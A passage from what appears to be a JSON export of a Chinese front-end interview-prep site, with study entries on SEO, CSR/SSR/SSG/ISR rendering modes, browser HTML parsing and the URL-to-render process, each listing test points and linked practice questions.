SEO 都很重要。\n     - 编写有效的 Meta 描述的方法。\n\n### 4. **关键词优化（Keyword Optimization）**\n   - **定义**：在页面内容中合理使用关键词，以提高该页面在相关搜索中的排名。\n   - **最佳实践**：避免关键词堆砌，确保内容自然流畅，同时合理使用关键词。\n   - **考察点**：\n     - 如何选择目标关键词？\n     - 关键词在页面中的正确位置和密度。\n     - 关键词堆砌（Keyword Stuffing）的危害。\n\n### 5. **URL 结构**\n   - **定义**：URL 结构对 SEO 很重要。简洁、描述性强且包含关键词的 URL 有助于提升页面的可读性和搜索引擎的排名。\n   - **最佳实践**：使用短小且富有描述性的 URL，避免使用过长的参数或乱码。\n   - **考察点**：\n     - 什么样的 URL 结构有利于 SEO？\n     - 静态 URL 与动态 URL 对 SEO 的影响。\n     - 如何优化 URL 以提高排名。\n\n### 6. **H1、H2 等标题标签**\n   - **定义**：标题标签（`<h1>`, `<h2>`, `<h3>` 等）帮助搜索引擎理解页面的结构和内容的层次。\n   - **最佳实践**：确保每个页面有且只有一个 `<h1>`，并且将重要的关键字放在 `<h1>` 标签中。使用 `<h2>`, `<h3>` 等标签来划分页面的子内容。\n   - **考察点**：\n     - 为什么 `<h1>` 标签对 SEO 很重要？\n     - 使用 `<h2>`, `<h3>` 等标签的正确方法。\n     - 如何使用标题标签提高页面的可访问性和 SEO。\n\n### 7. **图片优化（Image Optimization）**\n   - **定义**：优化图片大小、格式和 `alt` 属性，能够提高页面的加载速度，提升用户体验，同时也有助于 SEO。\n   - **最佳实践**：使用压缩的图片格式（如 WebP），确保图片有清晰的 `alt` 文本，图片大小适中。\n   - **考察点**：\n     - 如何优化图片文件大小以提升 SEO？\n     - `alt` 属性在图片 SEO 中的作用。\n     - 使用响应式图片（`<picture>` 标签）提高图片加载速度和 SEO。\n\n### 8. **内部链接结构（Internal Linking）**\n   - **定义**：内部链接是网站页面之间的链接，它们帮助搜索引擎抓取网站内容并理解页面之间的关系。\n   - **最佳实践**：创建良好的内部链接结构，确保重要页面容易访问，同时避免链接过度堆砌。\n   - **考察点**：\n     - 为什么内部链接对 SEO 很重要？\n     - 如何有效管理内部链接？\n     - 内部链接与页面排名的关系。\n\n### 9. **外部链接和反向链接（Backlinks）**\n   - **定义**：反向链接指的是其他网站指向你的网站的链接。搜索引擎将反向链接视为网站的“信誉”或“权威”的证明。\n   - **最佳实践**：获取高质量的反向链接，提高网站的可信度。\n   - **考察点**：\n     - 什么是反向链接？为什么它对 SEO 很重要？\n     - 如何获得高质量的反向链接？\n     - 低质量反向链接的影响（如垃圾链接、过度优化的链接等）。\n\n### 10. **网站速度优化**\n   - **定义**：页面加载速度是 SEO 排名的一个重要因素，尤其是对移动端用户来说。\n   - **最佳实践**：优化图片、使用懒加载、压缩 JavaScript 和 CSS 文件、启用浏览器缓存等。\n   - **考察点**：\n     - 为什么网站速度对 SEO 重要？\n     - 如何使用工具（如 Google PageSpeed Insights）评估网站速度？\n     - 优化网站速度的常见技术。\n\n### 11. **响应式设计与移动端优化**\n   - **定义**：移动优先（Mobile-first）和响应式设计（Responsive Design）是 SEO 的关键因素，因为 Google 等搜索引擎越来越倾向于为移动端优化排名。\n   - **最佳实践**：确保网站在所有设备上都能良好显示，使用适当的 `meta` 标签（如 `viewport`）。\n   - **考察点**：\n     - 响应式设计与 SEO 排名的关系。\n     - 如何通过 `meta viewport` 标签优化移动端体验？\n     - 如何测试和优化移动端友好性？\n\n### 12. **结构化数据（Structured Data）**\n   - **定义**：结构化数据是向搜索引擎提供标准化信息的方式，通常使用 JSON-LD、Microdata 或 RDFa 格式。\n   - **最佳实践**：通过结构化数据（如 Schema.org 标记）提供清晰的页面内容描述，帮助搜索引擎更好地理解页面的内容和功能。\n   - **考察点**：\n     - 什么是结构化数据？如何使用它提升 SEO？\n     - 使用结构化数据（如产品、评论、FAQ）来增加富媒体片段（rich snippets）。\n     - 结构化数据的常见实现方法和规范。\n\n### 13. **SEO 工具和技术**\n   - **定义**：通过工具分析网站的 SEO 性能，找出潜在问题并进行优化。\n   - **常见工具**：\n     - Google Search Console：用于检查网站的索引情况和性能。\n     - Google Analytics：监控网站的流量来源和用户行为。\n     - SEMrush、Ahrefs：分析关键词排名、反向链接等。\n   - **考察点**：\n     - 如何使用 Google Search Console 来提高 SEO？\n     - 介绍常用的 SEO 分析工具及其作用。\n     - 使用分析工具优化页面的关键词排名和流量。\n\n### 14. **SEO 中的用户体验（UX）**\n   - **定义**：用户体验在 SEO 中起着越来越重要的作用。良好的用户体验能提高页面的停留时间、降低跳出率，并影响排名。\n   - **考察点**：\n     - 用户体验如何影响 SEO 排名？\n     - 如何通过改进导航、内容和布局优化用户体验？",
    "exerciseKeyList": "[\"c14803df-f552-4a23-b50d-fd8e3f77f17e\",\"255b920d-ba6d-4e6a-85ac-58c78d2e0773\",\"2aa4ec3d-020c-4c2e-9147-53707afb2d4e\",\"1aa28332-a1a6-4778-812f-3226a2003614\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 20,
    "createAt": "2024-11-05T01:34:21.000Z",
    "updateAt": "2024-11-06T06:12:23.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "1aa28332-a1a6-4778-812f-3226a2003614",
        "title": "如何实现SEO优化",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-08-07T14:44:59.000Z",
        "updateAt": "2024-07-22T10:06:00.000Z"
      },
      {
        "exerciseKey": "255b920d-ba6d-4e6a-85ac-58c78d2e0773",
        "title": "SEO的原理是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-08-12T11:47:32.000Z",
        "updateAt": "2024-07-22T10:05:47.000Z"
      },
      {
        "exerciseKey": "2aa4ec3d-020c-4c2e-9147-53707afb2d4e",
        "title": "SEO是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-08-12T11:45:05.000Z",
        "updateAt": "2022-08-12T19:48:28.000Z"
      },
      {
        "exerciseKey": "c14803df-f552-4a23-b50d-fd8e3f77f17e",
        "title": "SPA应用怎么进行SEO？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2022-08-12T11:58:16.000Z",
        "updateAt": "2024-07-22T10:05:27.000Z"
      }
    ]
  },
  "148": {
    "id": 148,
    "tagId": 12,
    "title": "CSR，SSR和SSG",
    "explanation": "`SPA`、`MPA`、`SSR` 和 `CSR` 这几个词可能在你的工作生涯中经常出现，网上相关文章也很多。如果你对这些概念感到模糊或完全不了解，希望本文能帮助你理解这些渲染模式。\n\n### SPA 与 MPA\n\n#### MPA\n\nMPA（`multiple page application`） 称为**多页应用**, 指的是有多个页面的应用，从技术手段上来讲，你可以这么粗略地理解。\n\n-   **首屏速度快**：各个页面相互独立，需要单独维护多个 html 页面，每个请求都直接返回 html。\n-   **切换页面比较慢**：基于原生浏览器的文档跳转（`navigating across documents`）。因此每一次的页面更新都是一次页面重载，这将带来巨大的重启性能消耗。\n-   **对 SEO 友好**：页面在初始时，就具有全部的页面内容而非 「无状态」，从而达到更好的收录效果。\n\n#### SPA\n\nSPA（`single page application`）称为**单页应用**。通过 js 去感知到 url 的变化，动态的将当前页面的内容清除掉，然后将下一个页面的内容挂载到当前页面上。此时的路由不是后端来做了，而是前端来做，动态显示需要的组件。\n\n-   **页面切换速度快**：路由跳转是基于特定的实现（如 vue-router，react-router 等前端路由），而非原生浏览器的文档跳转，避免了不必要的整个页面重载。\n-   **前后端分离**：基于前端路由，SPA 与应用后端解耦，使得前端不再依赖于后端的路由分配。\n-   **首屏时间慢**：首屏除了 html 还要额外请求并执行 js 文件，通过 js 在空页面上渲染首屏。\n-   **SEO 不友好**：内容都是靠 js 渲染生成出来的，但搜索引擎并不识别这部分内容，导致 SEO 效果差\n\n### CSR（Client Side Rendering）\n\nCSR（客户端渲染）是一种在浏览器上执行 JavaScript 以生成 DOM 并显示内容的渲染方法。CSR 更贴近现代前端开发，我们通常使用的 Vue 和 React 默认使用 CSR。其大致流程如下：\n\n1.  浏览器向前端服务器请求 html 和 js\n2.  html 页面为空，初始加载不显示任何内容，通过执行 js 渲染内容\n3.  通过后端暴露的 API 进行交互\n\n对于典型的 CSR 应用程序，浏览器仅接收一个用作应用程序容器的 HTML 页面，因此也称为单页应用，所以 CSR 的特点与之前提到的 SPA 类似。\n\n![image (2).png](https://static.ecool.fun//others/6dc7af79-48dc-4c58-a41d-3a9dce05eb57.png)\n\n### SSR（Server Side Rendering）\n\n#### 概念\n\n在早期，开发者喜欢使用 JSP 或其他模板渲染引擎来构建应用，这种方法被称为SSR（服务器端渲染）。与客户端渲染不同，SSR 输出的是渲染完整的 HTML，整个渲染过程在服务器端进行。\n\n用户发起请求后，SSR 的流程大致如下：\n\n1.  后端服务通过数据层进行查询用户所需内容\n2.  处理业务逻辑\n3.  使用模板拼接页面\n4.  将渲染好的 HTML 字符串返回给客户端\n5.  前端渲染并加载 JS 脚本完成剩余交互\n\n![image (3).png](https://static.ecool.fun//others/fe45c4c3-4f79-42ce-bfcd-76aebeecaf8e.png)\n\n早期的 SSR 在内容更新/跳转，都需要再次请求服务器，重新加载一次页面。但在 React, Vue 等框架的加持下，我们语境中的 SSR 一般指的是**首屏服务端渲染**或**同构渲染（`Isomorphic render`）**，即新开页面访问 SSR 应用时，首屏会返回完整的 html，浏览器通过**注水**（`hydrate`）成为 React 或 Vue 应用，后续用户进行跳转等操作时不会再向服务端请求 html，而是以类似单页应用的方式进行。\n\n![ssr1 (1).png](https://static.ecool.fun//others/265d7acc-cc6a-4b2e-84aa-747dfe00fe3b.png)\n\n#### 同构直出\n\n上文中，我们提到了`hydrate`这个词，正是通过该操作使静态 html 页面转换成一个 Vue 或 React 应用，这依赖于 React 和 Vue 提供的「同构直出」功能。\n\n在服务端渲染中，有两种页面渲染的方式：\n\n-   后端服务器获取数据并组装 HTML 返回给浏览器解析渲染页面\n-   浏览器在交互过程中，请求新的数据并动态更新渲染页面\n\n这两种渲染方式的不同点在于运行环境的不同。同一份代码可以在客户端和服务器端运行，两个环境的渲染结果应该保持一致。因此，我们需要实现客户端和服务器端的路由、页面模板和数据共享。\n\n![image (4).png](https://static.ecool.fun//others/88dd517f-8933-4bb3-a7be-0937906d401d.png)\n\n我们通过`webpack`将打包出两份代码，一份在服务端运行。\n\n![vue服务端渲染构建 (1).png](https://static.ecool.fun//others/c058df5e-89ad-4460-8b02-4aba51888b83.png)\n\n##### 整体流程\n\n以 Nuxt 为例，整体的渲染流程如下所示：\n\n![SSR (1).png](https://static.ecool.fun//others/147dcc7b-ad50-4c2b-8af5-602554ff053f.png)\n\n#### 两个重要的概念\n\n##### 脱水（dehydrate）\n\n将组件树序列化成静态的 HTML 片段，能直接看到初始视图，不过已经无法与之交互了，但这种便携的形态尤其适合网络传输。这个脱去动态数据，成为风干标本一样的静态快照的过程被称为脱水（dehydrate）。\n\n##### 注水（hydrate）\n\n与脱水相反，将这个 html 躯干复活为 Vue 应用的过程称为注水。客户端并不重新生成 HTML 组件，而是重用服务器发送给它的 HTML，并附加「数据」与「交互性」，构建成完整的 Vue 应用，这个过程被称为注水（hydrate）。\n\n> Hydration is a process where a frontend framework like React, VueJS re-uses the static HTML structure it receives from the server (that was created at server-side at build time), and instead of re-generating the HTML nodes on the browser, simply “breathes” event handlers and interactivity into it.\n\n#### SSR 与 CSR 的对比\n\n##### 优点\n\n-   **SEO 友好**：搜索引擎爬虫可以直接抓取到最终页面内容。而 CSR 直接返回的 html 为空壳，对一些不加载执行 js 的低级爬虫来说这个页面的内容就是空的。\n-   **首屏时间更短**：服务端渲染直接返回带有数据的 HTML 文本，浏览器只需解析 HTML 并构建 DOM 树，无需额外执行 JS 来渲染首屏元素。\n\n##### 缺点\n\n-   **占用服务器资源**：渲染工作从浏览器转移到服务器，新增了数据获取的 IO 和渲染 HTML 的 CPU 占用。\n-   **代码复杂度增加**：需要同时兼容客户端和服务器端，代码编写时需要考虑两端的执行环境，且某些依赖库只能在客户端运行，增加了编码的复杂性。\n\n### SSG（Static Site Generation）\n\n#### 概念\n\nSSG（静态站点生成）与 SSR 的原理非常类似，但不同之处在于 HTML 文件是预先生成的，而不是在服务器实时生成。\n\n#### 工作流程\n\n1.  **构建阶段**：在构建过程中，SSG 将源文件和模板（如HTML、CSS）结合，生成静态页面。这些页面通常由预定义的布局、组件和样式组成。\n2.  **预渲染**：SSG 在构建过程中会自动执行预渲染。这意味着 SSG 会根据预定义的路由和数据源，在构建时生成静态页面的多个实例。例如，对于一个博客，每篇文章都可以在构建过程中生成一个独立的静态页面。\n3.  **静态输出**：一旦构建完成，SSG 将生成的静态页面输出到目标文件夹中。这些页面包含所有必要的 HTML、CSS 和 JavaScript，以及任何相关的静态资源（如图像、视频等）。\n4.  **部署**：生成的静态页面可以直接部署到任何支持静态文件的Web服务器上。因为这些页面不需要动态生成，所以它们可以被高效地缓存和交付给访问者，提供更好的性能和可扩展性。\n5.  **用户访问**：首屏直接解析 html 生成 dom。接着和 SSR 一样通过 hydrate 将整个应用转变成为 React 或 Vue 应用，使用户在交互时与单页应用无异。\n\n![ssg图示 (1).jpeg](https://static.ecool.fun//others/cf7cb078-453d-45f3-b713-a386f6f6a835.png)\n\n#### 特点\n\nSSG 的优缺点都非常明显，通常适用于静态页面，例如文档、博客、帮助站点和电子商务产品。\n\n##### 优点\n\n-   **性能高**：相比 SSR 减轻了服务器压力，还可以将生成的静态资源放到 CDN 上，充分利用缓存。\n-   **SEO 友好**：搜索引擎爬虫可以直接抓取到最终页面内容\n-   **易于部署**：生成的静态页面可以直接部署到任何支持静态文件的 Web 服务器上，无需依赖 Node 环境等。\n-   **高度安全性**：由于服务器不需要运行程序，因此服务器漏洞仅限于操作系统本身，维护也更加方便。\n\n##### 缺点\n\n-   **静态**：只适用于静态数据，对于经常改动的数据，需要每次重新生成页面。\n\n### ISR（Incremental Static Regeneration）\n\n#### 概念\n\nISR（增量式网站渲染）结合了 SSG 和 SSR 的优势。ISR 的核心思想是将部分静态页面在构建时生成，并在用户访问时进行增量更新。\n\n在 ISR 中，静态页面的构建仍然是在构建时完成的，类似于 SSG。然而，与完全静态的 SSG 不同，ISR 允许某些页面在构建后仍保持动态，并在用户首次访问时进行渲染。一旦渲染完成，生成的静态页面被缓存，并在后续的请求中被直接提供，以提高性能和响应速度。\n\n#### 工作流程\n\n1.  构建阶段：在构建过程中，使用SSG（静态站点生成器）生成静态页面，并将这些页面上传到 CDN。\n2.  用户发起页面请求：\n    -   请求静态页面： CDN 直接返回；\n    -   请求 ISR 页面，且该页面未被 CDN 缓存：直接响应 fallback 页面，浏览器接收到该页面后以 CSR 的形式渲染出内容；同时 CDN 会将请求转发到服务端，触发服务端渲染，服务器动态地生成页面内容，并返回给 CDN 进行缓存\n    -   请求 ISR 页面，该页面 CDN 已有缓存且未过期：直接返回缓存的 html 页面\n    -   请求 ISR 页面，该页面 CDN 已有缓存但已经过期：直接返回这份过期的缓存给浏览器，此时用户看到的是缓存已经过期的页面；同时 CDN 会将请求转发到服务端，触发服务端渲染，服务器动态地生成页面内容，并返回给 CDN 将该页面的缓存更新\n\n![ISR (1).png](https://static.ecool.fun//others/5e7c018c-a037-4836-acd1-320fbed3581b.png)\n\n#### 特点\n\n##### 优点\n\nISR 的优势在于它在静态和动态之间找到了一个平衡点。对于不经常变动的内容，可以通过SSG生成完全静态的页面，从而实现快速加载和低服务器负载。而对于可能需要频繁更新的部分，如评论区或实时数据，ISR 可以使用 SSR 来动态生成这些内容，并在后续的请求中进行增量更新，从而保持页面的实时性。\n\n##### 缺点\n\n-   访问到没被预渲染过的次要内容触发 fallback，需要进行 CSR，加载较慢。\n-   访问到之前被预渲染过，但已经过期且未更新的页面，会得到过期的缓存响应。用户刷新一次，才能看到新的数据。\n\n#### 应用场景\n\n本质上来说，ISR 仍然是 SSG 的范畴，复杂场景仍然无法应对。其典型应用场景包括博客评论、最新文章列表等。通过将这些动态内容与静态页面结合使用，可以在保持高性能和安全性的同时，提供更丰富和实时的用户体验。\n\n### 总结：\n- **CSR**：客户端渲染，适用于单页应用（SPA），页面交互丰富，但首屏加载慢，SEO 不友好。\n- **SSR**：服务器端渲染，适用于内容更新频繁且需要快速首屏渲染的页面，SEO 友好，但对服务器负担较大。\n- **SSG**：静态生成，适用于内容不经常变化的网站，加载速度快，SEO 友好，但对于动态内容支持较弱。",
    "testPoint": "1. **它们之间的区别**（CSR、SSR、SSG 的工作原理、优缺点）。\n2. **选择合适渲染方式的场景**（例如，哪些情况下使用 CSR、SSR 或 SSG）。\n3. **SSR 与 SEO 的关系**（SSR 如何影响 SEO 排名）。\n4. **SSR 中的首屏渲染优化**（如何优化 SSR 的加载时间）。\n5. **CSR 中的首屏渲染性能问题**（如何优化 CSR 的加载速度）。\n6. **静态生成的挑战与局限性**（SSG 如何处理动态内容更新）。\n7. **同构（Isomorphic）应用**（如何结合 CSR 和 SSR 实现同构应用）。\n8. **使用框架（如 Next.js、Nuxt.js）实现 SSR 或 SSG**（如何在这些框架中配置 SSR 或 SSG）。\n9. **静态站点与动态站点的选择**（何时选择静态生成或服务器端渲染）。\n10. **缓存策略的优化**（如何缓存 SSR 页面以提高性能）。\n11. **CSR 和 SSR 的结合使用**（如何在同一应用中结合 CSR 和 SSR）。",
    "exerciseKeyList": "[\"da682e52-a098-4f33-a4b5-9fd40bb48e99\",\"c50852c5-6471-4bd3-8392-02ab58e4c726\",\"4a0ca854-e576-4046-a740-f1ef8d4060c9\",\"f56eac8e-a286-4971-a9c4-77df60335d0c\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 21,
    "createAt": "2024-11-05T04:05:04.000Z",
    "updateAt": "2024-11-06T06:12:23.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "4a0ca854-e576-4046-a740-f1ef8d4060c9",
        "title": "SSR是什么？Vue中怎么实现？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:46:23.000Z",
        "updateAt": "2024-08-10T17:04:46.000Z"
      },
      {
        "exerciseKey": "c50852c5-6471-4bd3-8392-02ab58e4c726",
        "title": "CSR和SSR分别是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-11T02:36:10.000Z",
        "updateAt": "2024-08-10T17:05:21.000Z"
      },
      {
        "exerciseKey": "da682e52-a098-4f33-a4b5-9fd40bb48e99",
        "title": "CSR、SSR、SSG、NSR、ESR、ISR 都是什么？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T18:54:21.000Z"
      },
      {
        "exerciseKey": "f56eac8e-a286-4971-a9c4-77df60335d0c",
        "title": "说说你对 SSG 的理解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-04-27T11:44:52.000Z",
        "updateAt": "2024-07-22T10:04:09.000Z"
      }
    ]
  },
  "149": {
    "id": 149,
    "tagId": 12,
    "title": "浏览器解析 HTML 文件",
    "explanation": "## 1\\. 什么是浏览器解析和渲染HTML\n\n> 一句话概括：将html代码转换成页面上显示的内容。\n\n![image.png](https://static.ecool.fun//article/992b4a4a-9baf-49f8-97f7-28a590893c2e.jpeg)\n\n**表1：形象展示将HTML转换成页面上显示的内容**\n\n## 2\\. 浏览器解析和渲染HTML过程？\n\n那么浏览器拿到HTML代码后是如何把其转换成页面上显示的内容的？\n\n### 2.1 宏观描述执行过程\n\n#### 2.1.1 解析和渲染\n\n首先我们来看两个概念，解析和渲染，确切来说是DOM解析和DOM渲染。\n\n**DOM解析：** 生成DOM tree的过程。就是把你所写的各种html标签，生成一个DOM tree，可以认为就是生成了一个最原始的页面，一点样式都没有，毫无CSS修饰。\n\n**DOM渲染：** 将DOM tree与css样式结合，生成Render tree，并将其呈现在浏览器页面上。浏览器会把本身默认的样式+用户自己写得样式整合到一起，形成一个CSS tree，而DOM渲染就是指DOM tree 和CSS tree 结合到一起，生成一个Render tree，呈现出一个带有样式的页面。\n\n这里需要注意，**DOM解析和DOM渲染由两个不同的线程来完成的，简单说就是二者可以并行进行。**\n\nDOM解析通常是由浏览器的主线程来完成的。DOM渲染是由浏览器的渲染线程来完成的。\n\n分离解析和渲染的这种设计使得浏览器能够在解析 HTML 文档的同时将页面渲染到屏幕上，这样用户就能够更快地看到完整的页面了。\n\n#### 2.1.2 宏观描述执行过程\n\n补充了解析和渲染的概念，我们来看看浏览器具体是如何把其转换成页面上显示的内容的。其过程大致分为下图的四步。\n\n![](https://static.ecool.fun//article/d908efa9-da67-4202-aeb4-820e8ee4d132.jpeg)\n\n**图1：浏览器解析和渲染HTML的过程**\n\n**第一步**：将载入的HTML文件解析成DOM树（DOM tree），并且将各个标记标识解析成DOM树的各个节点；在解析HTML的同时会将CSS样式解析成CSS规则（CSS rules）。\n\n**第二步**：将解析成的DOM树和CSS规则进行关联生成渲染树（Render tree）。\n\n**第三步**：进入布局阶段，为DOM树的每个节点分配在屏幕上出现的确切坐标（这一阶段还是渲染树）\n\n**第四步**：进入绘制阶段，在这里渲染引擎的工作就结束了，接下来就给用户界面后端（UI Backend）对渲染树的每个节点进行绘制，呈现出页面效果。\n\n### 2.2 细化执行过程\n\n#### 2.2.1 顺序执行\n\ndom解析过程是从上向下，顺序执行的。顺序执行的意思是一行一行的执行，上一行执行完再执行下一行。\n\n```xml\n<h1>1<h1>\n<h1>2<h1>\n<h1>3<h1>\n<script></script>\n<style></style>\n<!-- 先1，再2，再3，按顺序解析。 -->\n```\n\n#### 2.2.2 渐进式\n\n浏览器是渐进式渲染，即边解析边渲染。通俗的说就是，这一行代码解析完，就可以在浏览器的页面渲染展示出来。因为浏览器的解析和渲染由两个不同线程来完成，所以可以实现边解析边渲染。\n\n```xml\n<h1>1</h1>\n<script>debugger</script>\n<h1>2</h1>\n<script>debugger</script>\n<h1>3</h1>\n<!-- 先解析渲染出1，再debugger;再解析渲染出2，再debugger;最后解析渲染出3 -->\n```\n\n### 2.3 问题：css、js会阻塞解析和渲染吗？\n\n这部分内容可参考这篇掘金内容，内含测试代码：[关于 JS 与 CSS 是否阻塞 DOM 的渲染和解析 - 掘金](https://juejin.cn/post/6973949865130885157#heading-0 \"https://juejin.cn/post/6973949865130885157#heading-0\")\n\n下述内容为该文章的一些结论整理。\n\n#### 2.3.1 js会阻塞解析和渲染吗？\n\n> JS会阻塞解析；JS会触发页面渲染；可以使用async和defer让它不阻塞\n\n-   JS会阻塞解析。\n    \n    -     关于JS阻塞DOM解析，比较合理的解释是，首先浏览器无法知晓JS的具体内容，倘若先解析DOM，万一JS内部全部删除掉DOM，那么浏览器就白忙活了，所以就干脆暂停解析DOM，等到JS执行完成再继续解析。\n-   JS会触发页面渲染。\n    \n    -     浏览器无法预先知道脚本的具体内容，因此在碰到< script>标签时，只好先渲染一次页面，确保脚本内能获取到DOM的最新的样式。倘若在决定渲染页面时，还有尚未加载完成的CSS样式，也只能等待其加载完成再去渲染页面，**这里也是后面css阻塞JS运行的真正原因。**\n-   可以使用async和defer让它不阻塞。\n    \n\n![](https://static.ecool.fun//article/e2d1d095-4a26-4e95-9efc-6df60b7411b3.jpeg)\n\n**图2：defer,async对HTML解析的影响**\n\n上图为defer,async的大致描述。其中蓝色代表js脚本网络加载时间，红色代表js脚本执行时间，绿色代表html解析。 \n\n#### 2.3.2 css会阻塞解析和渲染吗？\n\n> head里的css不会阻塞解析，但会阻塞渲染；head和body中的css都会阻塞js的执行，进而阻塞解析；body里的css是否阻塞解析因浏览器而异。\n\n-   head里的css不会阻塞解析，但会阻塞渲染。\n\nDOM Tree的解析和CSSOM Tree的解析是互不影响的，两者是并行的。因此CSS不会阻塞页面DOM的解析，但是由于render tree的生成是依赖DOM Tree和CSSOM Tree的，因此CSS必然会阻塞DOM的渲染。更为严谨一点的说，**CSS会阻塞render tree的生成，进而会阻塞DOM的渲染**。\n\n-   head和body中的css会阻塞js的执行，进而阻塞解析。\n\nJS脚本中的内容是获取DOM元素的CSS样式属性，如果JS想要获取到DOM最新的正确的样式，势必需要所有的CSS加载完成，否则获取的样式可能是错误或者不是最新的。因此要等到JS脚本前面的CSS加载完成，JS才能再执行，并且不管JS脚本中是否获取DOM元素的样式，浏览器都要这样做。\n\n-   body里的css因浏览器而异，存在浏览器样式闪烁（FOUC，Flash of Unstyled Content）的现象。\n\n由于浏览器引擎的架构方式不一致，在浏览器解析到Body内的CSS的时候，浏览器引擎是可以做出选择的。 一种选择是它可以在请求CSS的时候暂停后续DOM的解析，在CSS加载完成后再继续往后解析，此情况就会造成CSS阻塞DOM的解析，导致页面DOM解析及其样式渲染推迟，而此表现形式就与JS的情况相似。 另一种选择是它也可以在请求CSS的时候继续往后解析，此时CSS的加载与DOM的解析就是并行的，如果DOM 解析提前完成了，就会先渲染一次。等到CSS加载完成后再更新样式，此情况下部分DOM样式就会从默认样式立即跳转到有样式状态，形成样式闪烁。\n\n#### 2.3.3 其他标签\n\n> 会阻塞解析，因为顺序执行\n\nimage、iframe等，会阻塞dom的解析，因为顺序执行。\n\n## 3\\. 实践经验\n\n-   < script>标签根据需求场景合理使用async,defer。目的是根据需求克服JS阻塞DOM解析的问题。\n    \n-   写原生html代码，通常css放前面，js放后边。原因有两条：一是在加载html生成DOM tree的时候，可以同时对DOM tree进行渲染，用户体验感更好；二是JS会阻塞DOM解析，影响后续内容解析和渲染速度。\n    \n-   css尽可能写在head里。目的是避免因浏览器样式闪烁（FOUC)带来的差异。\n  ",
    "testPoint": "1. **浏览器解析 HTML 的基本过程**  \n2. **DOM 树与渲染树的构建过程**  \n3. **`DOCTYPE` 的作用与对浏览器渲染模式的影响**  \n4. **HTML 解析中的阻塞问题（如 CSS 和 JavaScript 阻塞）**  \n5. **Reflow（重排）与 Repaint（重绘）的区别与性能优化**  \n6. **如何优化首屏加载时间**  \n7. **浏览器如何处理外部资源（如图片、字体、CSS、JS）**  \n8. **资源的加载顺序及其对页面渲染的影响**  \n9. **CSSOM（CSS 样式对象模型）与 DOM 的结合如何影响渲染**  \n10. **浏览器缓存与性能优化**（如如何使用缓存策略、合并文件等）  \n11. **浏览器多线程与并发加载机制**  \n12. **HTML 渲染过程中可能的性能瓶颈及解决方法**  \n13. **如何避免或减少重排与重绘的次数**  \n14. **如何使用异步加载或懒加载优化页面性能**  \n",
    "exerciseKeyList": "[\"61b47ff6-9c4d-4fa2-b126-dc5ffff3e7c6\",\"8620e64e-4051-46a8-bef3-3b1031a29872\",\"869f1734-40bb-4954-8991-f3e5bac37808\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 22,
    "createAt": "2024-11-05T04:16:13.000Z",
    "updateAt": "2024-11-06T06:12:23.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "61b47ff6-9c4d-4fa2-b126-dc5ffff3e7c6",
        "title": "简述 html 页面渲染过程",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T07:08:18.000Z",
        "updateAt": "2024-08-10T21:35:30.000Z"
      },
      {
        "exerciseKey": "8620e64e-4051-46a8-bef3-3b1031a29872",
        "title": "什么是 HTML 文档的预解析？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-08-21T01:17:45.000Z"
      },
      {
        "exerciseKey": "869f1734-40bb-4954-8991-f3e5bac37808",
        "title": "浏览器是怎么解析 HTML 文档的？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-11-05T04:15:50.000Z",
        "updateAt": "2024-11-05T04:15:53.000Z"
      }
    ]
  },
  "150": {
    "id": 150,
    "tagId": 12,
    "title": "输入 URL 到页面渲染完成",
    "explanation": "## 一、网站加载概述\n\n面试过程中，常常遇到这样一道面试题，输入URL到页面加载完毕，浏览器做了哪些工作？\n\n> 首先输入一个URL，你会看到浏览器上面的标签页出现了一个loading图标，开始时是逆时针旋转，接着顺时针旋转，当前页面消失，显示我们常说的空白页面，接着出现显示我们请求的新页面。此时如果网络很差，你有可能看到短暂的DOM页面，然后再看到渲染后的正常页面，这是从表面看到的加载过程，实际浏览器做的要多得多。\n\n为什么浏览器这么多戏呢？直接显示不好吗，当然不行，就像喝粥，能直接吃米、喝水吗？\n\n在用户输入URL到页面展示，浏览器要先向服务器获取前端资源，然后再将服务器返回的字节流转化成对应的页面，每一阶段都需要浏览器对应的能力进行处理的。\n\n> 作为前端开发，了解整个过程其实很重要，只有知道了浏览器加载页面的整个过程，才能在开发中避免可能跳的坑，才能在发现问题后迅速定位问题，才能在性能优化时提出更多的解决方案。\n\n比如下面问题，看了文章相信你就知道了为什么了\n\n-   为什么会存在空白页面？(为了解决这个问题，各大厂都在实践各种方案）\n-   为什么js要在Dom后面引入\n-   为什么有个页面崩溃会导致多个页面崩溃\n-   浏览器的缓存策略是怎样的？\n-   为什么我们常常修改host就可以访问对应的域名\n-   等等\n\n## 二、浏览器的多进程架构\n\n为了看懂下面的内容，这里必须要了解下现代浏览器的`多进程架构`，`进程`和`线程`的关系等知识点。\n\n> 浏览器也是从单个进程架构一步步迭代到现代的多进程架构。\n\n![image.png](https://static.ecool.fun//article/5ca64547-859c-4afe-8a7e-ab9b2077d025.jpeg)\n\n如上图，我们可以看到`线程`和`进程`的关系\n\n-   通常一个程序实例就是一个进程，浏览器会为他分配内存空间。\n-   一个进程间的数据是共享的，单线程就是一个进程包含一个线程，一个线程处理所有的任务\n-   多线程就是，一个进程中包含多个线程可以同时执行任务，共享数据和内存\n-   线程不能单独存在，必须依附于进程，一个线程失败，会导致进程执行失败，进程销毁，内存会被立即回收。\n\n### 